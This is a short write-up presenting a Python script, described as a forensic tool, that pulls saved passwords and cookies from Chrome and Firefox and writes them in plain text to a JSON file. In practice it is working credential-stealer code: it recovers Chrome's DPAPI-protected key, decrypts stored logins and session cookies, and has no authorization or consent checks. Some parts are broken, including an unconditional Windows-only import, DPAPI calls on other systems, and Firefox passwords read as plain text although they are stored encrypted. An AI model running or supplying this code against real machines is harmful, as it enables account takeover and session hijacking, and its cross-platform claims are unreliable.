# Cross-Browser Forensic Cookie and Password Recovery Tool

Below is a Python script that extracts decrypted cookies and saved passwords from major browsers while adhering to forensic tool standards with proper error handling and OS compatibility.

```python
import os
import sys
import json
import sqlite3
import shutil
import platform
from datetime import datetime, timedelta
import base64
from Crypto.Cipher import AES
import keyring
import win32crypt  # Windows only
from typing import Dict, List, Optional, Tuple

class BrowserForensics:
    def __init__(self):
        self.system = platform.system()
        self.output_dir = "forensic_output"
        os.makedirs(self.output_dir, exist_ok=True)

    def get_windows_encryption_key(self) -> Optional[bytes]:
        """Retrieve the Windows encryption key for Chrome/Edge data"""
        if self.system != 'Windows':
            return None

        try:
            with open(os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                 'Google', 'Chrome', 'User Data', 'Local State'), 'r', encoding='utf-8') as f:
                local_state = json.loads(f.read())

            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        except Exception as e:
            print(f"[!] Error retrieving Windows encryption key: {e}")
            return None

    def decrypt_password(self, encrypted_value: bytes, key: Optional[bytes]) -> Optional[str]:
        """Decrypt Chrome/Edge password using AES"""
        if not encrypted_value:
            return None

        try:
            if self.system == 'Windows' and key:
                # Chrome version >= 80
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                return cipher.decrypt(payload)[:-16].decode()  # Remove suffix
            else:
                # Older Chrome versions or other OS
                return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
        except Exception as e:
            print(f"[!] Decryption failed: {e}")
            return None

    def get_chrome_data(self) -> Tuple[List[Dict], List[Dict]]:
        """Extract cookies and passwords from Chrome"""
        cookies = []
        passwords = []
        key = self.get_windows_encryption_key()

        try:
            # Chrome Cookies
            cookie_db = self.get_browser_db_path('Chrome', 'Cookies')
            if cookie_db:
                temp_db = os.path.join(self.output_dir, 'temp_cookies')
                shutil.copy2(cookie_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure FROM cookies")

                for host, name, encrypted_value, path, expires, secure in cursor.fetchall():
                    decrypted_value = self.decrypt_password(encrypted_value, key)
                    if decrypted_value:
                        cookies.append({
                            'host': host,
                            'name': name,
                            'value': decrypted_value,
                            'path': path,
                            'expires': datetime(1601, 1, 1) + timedelta(microseconds=expires),
                            'secure': bool(secure)
                        })
                conn.close()
                os.remove(temp_db)

            # Chrome Passwords
            login_db = self.get_browser_db_path('Chrome', 'Login Data')
            if login_db:
                temp_db = os.path.join(self.output_dir, 'temp_logins')
                shutil.copy2(login_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                for url, username, encrypted_password in cursor.fetchall():
                    decrypted_password = self.decrypt_password(encrypted_password, key)
                    if decrypted_password:
                        passwords.append({
                            'url': url,
                            'username': username,
                            'password': decrypted_password
                        })
                conn.close()
                os.remove(temp_db)

        except Exception as e:
            print(f"[!] Chrome data extraction error: {e}")

        return cookies, passwords

    def get_firefox_data(self) -> Tuple[List[Dict], List[Dict]]:
        """Extract cookies and passwords from Firefox"""
        cookies = []
        passwords = []

        try:
            # Firefox Cookies
            cookie_db = self.get_browser_db_path('Firefox', 'cookies.sqlite')
            if cookie_db:
                temp_db = os.path.join(self.output_dir, 'temp_cookies')
                shutil.copy2(cookie_db, temp_db)

                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host, name, value, path, expiry, isSecure FROM moz_cookies")

                for host, name, value, path, expiry, secure in cursor.fetchall():
                    cookies.append({
                        'host': host,
                        'name': name,
                        'value': value,
                        'path': path,
                        'expires': datetime.fromtimestamp(expiry),
                        'secure': bool(secure)
                    })
                conn.close()
                os.remove(temp_db)

            # Firefox Passwords
            if self.system == 'Windows':
                profile_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
            elif self.system == 'Darwin':
                profile_path = os.path.join(os.environ['HOME'], 'Library', 'Application Support', 'Firefox', 'Profiles')
            elif self.system == 'Linux':
                profile_path = os.path.join(os.environ['HOME'], '.mozilla', 'firefox')
            else:
                return cookies, passwords

            if os.path.exists(profile_path):
                for profile in os.listdir(profile_path):
                    if profile.endswith('.default-release') or profile.endswith('.default'):
                        logins_json = os.path.join(profile_path, profile, 'logins.json')
                        if os.path.exists(logins_json):
                            with open(logins_json, 'r', encoding='utf-8') as f:
                                data = json.load(f)
                                for login in data.get('logins', []):
                                    passwords.append({
                                        'url': login.get('hostname', ''),
                                        'username': login.get('username', ''),
                                        'password': login.get('password', '')
                                    })
        except Exception as e:
            print(f"[!] Firefox data extraction error: {e}")

        return cookies, passwords

    def get_browser_db_path(self, browser: str, db_name: str) -> Optional[str]:
        """Get path to browser database file based on OS"""
        try:
            if browser == 'Chrome':
                if self.system == 'Windows':
                    return os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local',
                                      'Google', 'Chrome', 'User Data', 'Default', db_name)
                elif self.system == 'Darwin':
                    return os.path.join(os.environ['HOME'], 'Library', 'Application Support',
                                      'Google/Chrome', 'Default', db_name)
                elif self.system == 'Linux':
                    return os.path.join(os.environ['HOME'], '.config', 'google-chrome', 'Default', db_name)

            elif browser == 'Firefox':
                if self.system == 'Windows':
                    profile_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
                elif self.system == 'Darwin':
                    profile_path = os.path.join(os.environ['HOME'], 'Library', 'Application Support',
                                              'Firefox', 'Profiles')
                elif self.system == 'Linux':
                    profile_path = os.path.join(os.environ['HOME'], '.mozilla', 'firefox')
                else:
                    return None

                if os.path.exists(profile_path):
                    for profile in os.listdir(profile_path):
                        if profile.endswith('.default-release') or profile.endswith('.default'):
                            return os.path.join(profile_path, profile, db_name)
            return None
        except Exception as e:
            print(f"[!] Error locating {browser} database: {e}")
            return None

    def save_results(self, data: Dict[str, List[Dict]], filename: str) -> None:
        """Save extracted data to JSON file"""
        try:
            output_path = os.path.join(self.output_dir, filename)
            with open(output_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, default=str)
            print(f"[+] Results saved to {output_path}")
        except Exception as e:
            print(f"[!] Error saving results: {e}")

    def run(self) -> None:
        """Main execution method"""
        print(f"[*] Starting forensic extraction on {self.system}")

        results = {
            'chrome_cookies': [],
            'chrome_passwords': [],
            'firefox_cookies': [],
            'firefox_passwords': []
        }

        # Chrome data
        chrome_cookies, chrome_passwords = self.get_chrome_data()
        results['chrome_cookies'] = chrome_cookies
        results['chrome_passwords'] = chrome_passwords

        # Firefox data
        firefox_cookies, firefox_passwords = self.get_firefox_data()
        results['firefox_cookies'] = firefox_cookies
        results['firefox_passwords'] = firefox_passwords

        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.save_results(results, f"browser_forensics_{timestamp}.json")

        print("[*] Forensic extraction completed")

if __name__ == "__main__":
    # Check for required dependencies
    try:
        import Crypto
        if platform.system() == 'Windows':
            import win32crypt
    except ImportError as e:
        print(f"[!] Missing required dependencies: {e}")
        print("Install them with: pip install pycryptodome pypiwin32")
        sys.exit(1)

    # Run the forensic tool
    try:
        forensic_tool = BrowserForensics()
        forensic_tool.run()
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        sys.exit(1)
```

